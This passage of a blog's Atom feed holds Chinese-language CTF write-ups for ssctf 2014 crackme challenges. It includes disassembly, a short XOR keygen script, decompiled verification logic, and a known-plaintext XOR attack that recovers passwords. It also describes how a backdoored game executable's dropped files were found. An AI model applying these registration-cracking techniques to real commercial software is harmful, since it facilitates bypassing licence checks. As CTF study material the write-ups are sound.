ebx,ecx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402292    75 17           jnz short CrackMe.004022AB&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402294    6A 00           push 0x0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402296    6A 00           push 0x0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402298    68 20404000     push CrackMe.00404020                    ; ASCII &amp;quot;注册成功！&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040229D    8BCF            mov ecx,edi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040229F    E8 14040000     call &amp;lt;jmp.&amp;amp;MFC42.#4224&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004022A4    5F              pop edi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004022A5    5E              pop esi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004022A6    5B              pop ebx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004022A7    8BE5            mov esp,ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004022A9    5D              pop ebp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;004022AA    C3              retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402384    6A 00           push 0x0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402386    6A 00           push 0x0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;00402388    68 2C404000     push CrackMe.0040402C                    ; ASCII &amp;quot;注册失败！&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040238D    8BCF            mov ecx,edi&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0040238F    E8 24030000     call &amp;lt;jmp.&amp;amp;MFC42.#4224&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据这个写出注册机就行&lt;/p&gt;
&lt;h2 id=&quot;注册算法&quot;&gt;&lt;a href=&quot;#注册算法&quot; class=&quot;headerlink&quot; title=&quot;注册算法&quot;&gt;&lt;/a&gt;&lt;strong&gt;注册算法&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;待续&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;crack5中的坑&quot;&gt;&lt;a href=&quot;#crack5中的坑&quot; class=&quot;headerlink&quot; title=&quot;crack5中的坑&quot;&gt;&lt;/a&gt;&lt;strong&gt;crack5中的坑&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;注册验证函数中，各种int 3，致使进入通过SetUnhandledExceptionFilter设置的异常处理函数TopLevelExceptionFilter，在TopLevelExceptionFilter控制验证函数中的执行流程，由于先前我用的win7 x64调试，注册毫无反应，以为验证函数无法正常完整执行，so手工乱恢复，看了writeup之后，在xp中调试，你妹，居然可以正常执行…这是坑吗&lt;/p&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://anhkgg.github.io/categories/ctf/"/>
    
    
      <category term="ssctf" scheme="http://anhkgg.github.io/tags/ssctf/"/>
    
  </entry>
  
  <entry>
    <title>ssctf writeup by anhkgg</title>
    <link href="http://anhkgg.github.io/ssctf-2014-11-1/"/>
    <id>http://anhkgg.github.io/ssctf-2014-11-1/</id>
    <published>2014-11-03T08:01:09.000Z</published>
    <updated>2016-07-07T04:34:56.388Z</updated>
    
    <content type="html">&lt;h1 id=&quot;ssctf-wirteup&quot;&gt;&lt;a href=&quot;#ssctf-wirteup&quot; class=&quot;headerlink&quot; title=&quot;ssctf wirteup&quot;&gt;&lt;/a&gt;&lt;strong&gt;ssctf wirteup&lt;/strong&gt;&lt;/h1&gt;&lt;h3 id=&quot;1-web8-U盘病毒&quot;&gt;&lt;a href=&quot;#1-web8-U盘病毒&quot; class=&quot;headerlink&quot; title=&quot;1. web8 U盘病毒&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. web8 U盘病毒&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;UP_BOOT.img解压之后是两个文件autorun.txt和&lt;code&gt;是男人你就下100层.exe&lt;/code&gt;，autorun.txt中的内容是”你真厉害都到这了，看看这个游戏你肯定会喜欢的，但是据说这个游戏是被加了后门的，找到后门操作的文件的内容，取文件内容的16位md5值作为key！祝你好运…….”。&lt;br&gt;根据题目知道&lt;code&gt;是男人你就下100层.exe&lt;/code&gt;添加了后门，那么在执行的时候肯定要释放后门，所以找了一款 文件操作监控工具 进行监测，添加了文件创建，进程创建监测，然后发现在tmp目录中创建了RarSFX0目录，然后在RarSFX0中创建了1.exe, 1.vbs, 2.exe，以及test.txt，简单查看1.vbs启动1.exe和2.exe，1.exe是后门，2.exe是原始的&lt;code&gt;是男人你就下100层.exe&lt;/code&gt;，test.txt时候后门生成的，题目中要后门操作文件的·内容·16位md5作为key，那么1.exe，2.exe不大可能，只有1.vbs和test.txt了，提交了两次，test.txt的内容md5成功。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;2-crack1&quot;&gt;&lt;a href=&quot;#2-crack1&quot; class=&quot;headerlink&quot; title=&quot;2.crack1&quot;&gt;&lt;/a&gt;&lt;strong&gt;2.crack1&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;代码很简单，输入用户名密码之后，讲密码每个字符和408030所在内存的数据xor得到的值和用户名比较，相同则成功。用了个py脚本将用户名和408030内存的值xor得到密码，然后密码的md5即是key&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;k = [1, 2, 3, 4, 1, 5]#408030的值，还有其他的&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;n = &amp;quot;xxxxx&amp;quot;#用户名&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;a = &amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;for i in range(0, len(n)):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    k1 = ord(n[i])&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    k1 = k[i] ^ k1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    a = a + chr(k1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;print a&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;3-crack2&quot;&gt;&lt;a href=&quot;#3-crack2&quot; class=&quot;headerlink&quot; title=&quot;3.crack2&quot;&gt;&lt;/a&gt;&lt;strong&gt;3.crack2&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;反调试太多，没搞定&lt;/p&gt;
&lt;h3 id=&quot;4-crack3&quot;&gt;&lt;a href=&quot;#4-crack3&quot; class=&quot;headerlink&quot; title=&quot;4.crack3&quot;&gt;&lt;/a&gt;&lt;strong&gt;4.crack3&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;程序流程是，多次右键或者左键点击，会给403070写入R或者L字符，48次之后，点击确认，如果右键活左键点击姿势正确，就可以弹出正确的key。&lt;br&gt;验证过程是，通过48个L或者R可到key，如果通过48个L或者R的一个算法得到”查水表“三个字，那么点击姿势正确，key也正确，所以需要通过”查水表“的值逆推得到L和R的个数，具体算法是：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;do&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v11[v2] = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v3 = v1;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if ( __SETO__(v1, v1 + 8) ^ 1 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      do&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	v4 = 2 * v11[v2];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	v5 = a1[v3] == 0x52;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	v11[v2] = v4;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if ( v5 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	  v11[v2] = v4 + 1;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	++v3;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      while ( v3 &amp;lt; v1 + 8 );&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    v1 += 8;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ++v2;                                      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;”查水表“的值是B2 E9 CB AE  B1 ED，通过上面算法和B2 E9 CB AE  B1 ED推得点击姿势是:&lt;br&gt;RLRRLLRLRRRLRLLRRRLLRLRRRLRLRRRLRLRRLLLRRRRLRRLR&lt;br&gt;然后，操作一次，或者调试器内存修改，都可以得到key&lt;/p&gt;
&lt;h3 id=&quot;5-crack4&quot;&gt;&lt;a href=&quot;#5-crack4&quot; class=&quot;headerlink&quot; title=&quot;5.crack4&quot;&gt;&lt;/a&gt;&lt;strong&gt;5.crack4&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;题目是&lt;br&gt;”输入正确的密码，会释放出文件。key就在文件中。&lt;br&gt;tips:第一层密码为6为纯数字，第二层密码也是6位。“&lt;br&gt;粗略分析，输入第一次密码，释放并解密得到encrypt.exe，是一个exe，运行这个exe，输入第二次密码，释放并解密得到一个gif，密码验证算法是md5(md5(“HOWMPxxxxxx”)) == 09B2F924C20C5CA427EED2C5B98BEFBF，xxxxxx就是密码，先前一直想md5算出来，，没可能，后面发现释放文件之后的解密算法是xor，那么，嘿嘿，exe和gif格式的开头几个字节都是固定的，那么通过加密文件和正常文件的前6个字节xor即可得到密码，分别是564987和w!q&amp;amp;cs&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;MZ...... =&amp;gt;4D 5A 00 00 00 00 xor 78 6C 34 39 38 37 =&amp;gt;35 36 34 49 48 47 =》564987&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;GIF89aX =》47 49 46 38 39 61 58 xor 30 68 37 1E 5A 12 =&amp;gt; w!q&amp;amp;cs&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后得到解密之后的图片，图片就有key&lt;/p&gt;
&lt;h3 id=&quot;6-crack5&quot;&gt;&lt;a href=&quot;#6-crack5&quot; class=&quot;headerlink&quot; title=&quot;6.crack5&quot;&gt;&lt;/a&gt;&lt;strong&gt;6.crack5&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;这到题太坑，点击注册啥反应没有，以为是没有调用注册功能函数，后来通过网上的特征码定位到了注册按钮的函数，地址是：00401640，结果一看代码全是混淆，各种int 3，jmp，，完全无法正常执行，所以点击之后无反应，尝试恢复，大概流程得到，先UpdateData获取到输入，然后一段算法比较，MessageBox注册成功或者失败。。但是加密算法那部分，实在是无力恢复了。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ssctf-wirteup&quot;&gt;&lt;a href=&quot;#ssctf-wirteup&quot; class=&quot;headerlink&quot; title=&quot;ssctf wirteup&quot;&gt;&lt;/a&gt;&lt;strong&gt;ssctf wirteup&lt;/strong&gt;&lt;/h1&gt;&lt;h3 id=&quot;1-web8-U盘病毒&quot;&gt;&lt;a href=&quot;#1-web8-U盘病毒&quot; class=&quot;headerlink&quot; title=&quot;1. web8 U盘病毒&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. web8 U盘病毒&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;UP_BOOT.img解压之后是两个文件autorun.txt和&lt;code&gt;是男人你就下100层.exe&lt;/code&gt;，autorun.txt中的内容是”你真厉害都到这了，看看这个游戏你肯定会喜欢的，但是据说这个游戏是被加了后门的，找到后门操作的文件的内容，取文件内容的16位md5值作为key！祝你好运…….”。&lt;br&gt;根据题目知道&lt;code&gt;是男人你就下100层.exe&lt;/code&gt;添加了后门，那么在执行的时候肯定要释放后门，所以找了一款 文件操作监控工具 进行监测，添加了文件创建，进程创建监测，然后发现在tmp目录中创建了RarSFX0目录，然后在RarSFX0中创建了1.exe, 1.vbs, 2.exe，以及test.txt，简单查看1.vbs启动1.exe和2.exe，1.exe是后门，2.exe是原始的&lt;code&gt;是男人你就下100层.exe&lt;/code&gt;，test.txt时候后门生成的，题目中要后门操作文件的·内容·16位md5作为key，那么1.exe，2.exe不大可能，只有1.vbs和test.txt了，提交了两次，test.txt的内容md5成功。&lt;/p&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://anhkgg.github.io/categories/ctf/"/>
    
    
      <category term="ssctf" scheme="http://anhkgg.github.io/tags/ssctf/"/>
    
  </entry>
  
</feed>
